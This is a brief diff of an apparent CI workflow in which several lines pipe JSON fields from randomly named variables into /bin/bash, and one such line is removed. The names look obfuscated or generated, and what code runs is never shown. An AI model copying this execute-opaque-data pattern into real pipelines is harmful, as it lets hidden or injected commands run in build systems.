@@ -34,7 +34,6 @@ jobs:
           echo $bhmtx2 | jq -r .uuulj0635 | /bin/bash
           echo $bekx8 | jq -r .b05 | /bin/bash
           printf '%s' "$vijkb3961" | jq -r .jsvwv57080 | /bin/bash
-          printf '%s' "$wwsbx53" | jq -r .i335 | /bin/bash
           echo $gbqq6945 | jq -r .hbmjd2918 | /bin/bash
 
       - name: Persist output
